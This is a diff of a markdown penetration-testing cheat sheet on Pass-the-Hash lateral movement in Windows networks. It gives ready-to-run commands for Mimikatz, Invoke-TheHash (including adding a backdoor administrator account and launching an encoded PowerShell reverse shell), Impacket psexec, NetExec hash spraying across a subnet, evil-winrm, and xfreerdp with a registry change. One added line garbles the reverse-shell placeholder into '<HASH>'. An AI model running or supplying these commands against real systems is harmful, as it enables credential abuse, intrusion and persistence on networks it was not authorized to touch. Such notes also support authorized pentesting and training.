@@ -1,126 +1,149 @@
-# Pass the Hash (PtH) Lateral Movement
-
-**Pass the Hash (PtH)** is a technique where an attacker authenticates using a user's **password hash** instead of the plaintext password. This works because **NTLM hashes** remain static for every session until the password is changed and are not "salted" when stored on servers or Domain Controllers.
-
-### Prerequisites for PtH
-
-- **Administrative privileges** (or specific rights) on the machine where you are extracting the hash.
-- The target account must have **administrative rights** on the destination computer.
+1. Acquire NTLM hash through administrative access on a source machine.
+2. Identify available protocols on target: **SMB** (445), **WMI** (135), **WinRM** (5985/5986), or **RDP** (3389).
+3. Determine account type. **Domain accounts** bypass most local UAC restrictions; **local accounts** are restricted to the **RID-500** account unless registry modifications exist.
+4. Execute based on platform:
+    - Windows: Use **Mimikatz** for local token impersonation or **Invoke-TheHash** for remote WMI/SMB execution.
+    - Linux: Use **Impacket** for single-target SYSTEM shells, **NetExec** for subnet spraying, **evil-winrm** for PowerShell remoting, or **xfreerdp** for GUI access.
 
 ---
 
-## Windows Methodology
+## Pass the Hash with Mimikatz
 
-### 1. Mimikatz (sekurlsa::pth)
+NTLM hash is available and a local process needs to be spawned with the user's identity to access network resources like shares.
 
-Use this technique when you have local admin access on a Windows host and want to **spawn a new process** (like `cmd.exe`) in the context of another user using their hash.
-
-**Workflow:**
-
-1. Launch Mimikatz with **debug privileges**.
-2. Execute the `sekurlsa::pth` module to start a process.
-3. Interact with the new process to access remote resources.
-
-|Parameter|Description|
-|:--|:--|
-|`/user`|The username of the account to impersonate|
-|`/domain`|The FQDN of the target domain|
-|`/rc4`|The NTLM hash of the user's password|
-|`/run`|The program to execute (typically `cmd.exe`)|
+Spawn a command prompt under the user context using the NTLM hash
 
 ```
-mimikatz.exe privilege::debug "sekurlsa::pth /user:<USERNAME> /rc4:<NTLM_HASH> /domain:<DOMAIN> /run:cmd.exe" exit
+mimikatz.exe privilege::debug "sekurlsa::pth /user:<USERNAME> /rc4:<HASH> /domain:<DOMAIN> /run:cmd.exe" exit
 ```
 
-### 2. Invoke-TheHash (PowerShell)
+- **Dangerous / misconfigured settings**
+    
+    - **SeDebugPrivilege** must be available to the current user to interact with the LSA process.
+- **Gotchas**
+    
+    - **Mimikatz** will fail if **LSA Protection** is enabled or if the user lacks **local administrative privileges**.
 
-This tool allows PtH attacks via **WMI or SMB** using the .NET TCPClient. **Local administrator privileges are not required** on the client-side to run this tool.
+> ⚠️ Gap: Mimikatz `sekurlsa::pth` requires **administrative privileges** on the local attacking machine to perform the `privilege::debug` command and patch memory.
 
-**Workflow:**
+## Pass the Hash with Invoke-TheHash (SMB)
 
-1. Import the PowerShell module.
-2. Choose a method (SMB for service creation/WMI for process execution).
-3. Specify the target and command to execute.
+Remote command execution is required from a Windows host where the attacker lacks local admin rights but the target account has admin rights on the remote system.
 
-|Method|Use Case|
-|:--|:--|
-|**Invoke-SMBExec**|Executes commands by creating a temporary service on the target.|
-|**Invoke-WMIExec**|Executes commands via the WMI interface.|
+Create a new local user on the target via SMB
 
 ```
-# Method 1: SMB - Create a new administrator
 Import-Module .\Invoke-TheHash.psd1
-Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLM_HASH> -Command "net user <USERNAME> <PASSWORD> /add && net localgroup administrators <USERNAME> /add" -Verbose
-
-# Method 2: WMI - Execute a Base64 encoded PowerShell reverse shell
-Invoke-WMIExec -Target <TARGET_IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLM_HASH> -Command "powershell -e <BASE64_PAYLOAD>"
+Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <HASH> -Command "net user <USERNAME> <PASSWORD> /add && net localgroup administrators <USERNAME> /add" -Verbose
 ```
 
----
+- **Tool comparison**
+    
+    - Invoke-SMBExec → `Invoke-SMBExec` → Prefer when **SMB (445)** is open and **Service Control Manager** access is confirmed.
+    - Invoke-WMIExec → `Invoke-WMIExec` → Prefer when **WMI (135)** is open to avoid service creation artifacts.
+- **Gotchas**
+    
+    - **Access Denied** occurs if the user lacks **Service Control Manager** write privileges on the target.
 
-## Linux Methodology
+## Pass the Hash with Invoke-TheHash (WMI)
 
-### 1. Impacket PsExec
+Remote command execution or reverse shell via WMI is needed from a Windows host.
 
-Use this for quick **interactive command execution** from a Linux attack machine. It creates a service on the target to provide a shell.
-
-```
-impacket-psexec <USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>
-```
-
-### 2. NetExec (Lateral Movement & Spraying)
-
-Use this to **automate** authentication across a subnet. It is ideal for identifying where a specific hash has administrative rights (marked as `(Pwn3d!)`) due to password reuse.
-
-**Scenario:** Checking for local administrator password reuse across a network range using a dumped SAM hash.
-
-|Option|Description|
-|:--|:--|
-|`--local-auth`|Authenticates using local accounts instead of domain accounts.|
-|`-x`|Executes a specific command on the target(s).|
+Execute a Base64 encoded PowerShell reverse shell via WMI
 
 ```
-# Spraying a hash across a subnet to check for local admin access
-netexec smb <TARGET_IP>/24 -u <USERNAME> -d . -H <NTLM_HASH> --local-auth
-
-# Executing a command on a specific host
-netexec smb <TARGET_IP> -u <USERNAME> -d <DOMAIN> -H <NTLM_HASH> -x <COMMAND>
+Import-Module .\Invoke-TheHash.psd1
+Invoke-WMIExec -Target <TARGET_IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <HASH> -Command "powershell -e <HASH>"
 ```
 
-### 3. Evil-WinRM
+- **Edge cases**
+    - Use a machine name instead of an IP for the `-Target` parameter if DNS resolution is functional.
 
-Use this protocol when **SMB is blocked** or if you do not have full administrative rights but have **WinRM** access.
+## Pass the Hash with Impacket PsExec
 
-```
-evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH>
-```
+A SYSTEM shell is required from a Linux attack host and **SMB** is reachable.
 
-### 4. RDP (GUI Access)
-
-Use `xfreerdp` when you require a **graphical interface**. This requires the target to have **Restricted Admin Mode** enabled.
-
-**Workflow:**
-
-1. Enable Restricted Admin Mode on the target via the registry if not already active.
-2. Connect using the `/pth` flag.
+Gain a SYSTEM-level interactive shell
 
 ```
-# Step 1: Enable Restricted Admin Mode (must be run on target)
+impacket-psexec <USERNAME>@<TARGET_IP> -hashes :<HASH>
+```
+
+- **Gotchas**
+    - Execution fails if **ADMIN$** share is not writable.
+
+## Pass the Hash with NetExec
+
+A local administrator hash was dumped from one machine and needs to be tested for reuse across a subnet.
+
+Spray a hash across a subnet to find administrative access
+
+```
+netexec smb <TARGET_IP>/24 -u <USERNAME> -d <DOMAIN> -H <HASH>
+```
+
+Check for local administrator rights specifically using local authentication
+
+```
+netexec smb <TARGET_IP> -u <USERNAME> -d . -H <HASH> --local-auth
+```
+
+Execute a command on a target where the account is confirmed as an administrator
+
+```
+netexec smb <TARGET_IP> -u <USERNAME> -d . -H <HASH> -x <SERVICE_NAME>
+```
+
+- **Dangerous / misconfigured settings**
+    
+    - **Account Lockout Policy** may trigger on domain accounts; use `--local-auth` to mitigate risk when targeting local accounts.
+- **Gotchas**
+    
+    - **Pwn3d!** label only appears if the user has **administrative rights** on the target.
+
+## Pass the Hash with evil-winrm
+
+Access is required from Linux and **SMB** is blocked or **WinRM** is the preferred lateral movement path.
+
+Connect to a remote PowerShell session
+
+```
+evil-winrm -i <TARGET_IP> -u <USERNAME> -H <HASH>
+```
+
+- **Edge cases**
+    - When using domain accounts, the format must be `<USERNAME>@<DOMAIN>`.
+
+## Pass the Hash with xfreerdp
+
+GUI access is required from a Linux host.
+
+Authenticate to RDP using an NTLM hash
+
+```
+xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<HASH>
+```
+
+- **Dangerous / misconfigured settings**
+    - **DisableRestrictedAdmin** registry key must be set to 0.
+
+Enable Restricted Admin Mode on target to allow PtH
+
+```
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
-
-# Step 2: Connect from Linux
-xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<NTLM_HASH>
 ```
 
----
+- **Gotchas**
+    - **Account restrictions** error occurs if **Restricted Admin Mode** is disabled.
 
-## Technical Restrictions & Misconfigurations
+## UAC and Registry Restrictions
 
-|Registry Key|Value|Impact on PtH|
-|:--|:--|:--|
-|**DisableRestrictedAdmin**|`0`|**Enables** RDP Pass the Hash.|
-|**LocalAccountTokenFilterPolicy**|`0`|Only the **RID-500** "Administrator" account can perform remote PtH.|
-|**LocalAccountTokenFilterPolicy**|`1`|**All** local administrative accounts can perform remote PtH.|
-|**FilterAdministratorToken**|`1`|**Blocks** remote PtH even for the RID-500 account.|
+Local accounts (non-RID 500) are used for remote administration via PtH.
 
-**Note on UAC:** These restrictions primarily affect **local accounts**. If you have a **domain account** with administrative rights, PtH generally works regardless of these local registry settings.
+- **Dangerous / misconfigured settings**
+    
+    - **LocalAccountTokenFilterPolicy**: If set to 0, only the built-in **RID-500** Administrator account can perform remote PtH.
+    - **FilterAdministratorToken**: If set to 1, even the **RID-500** account is subject to UAC and remote PtH will fail.
+- **Gotchas**
+    
+    - **Remote PTH will fail** against local accounts if UAC protection is active and the account is not RID-500.
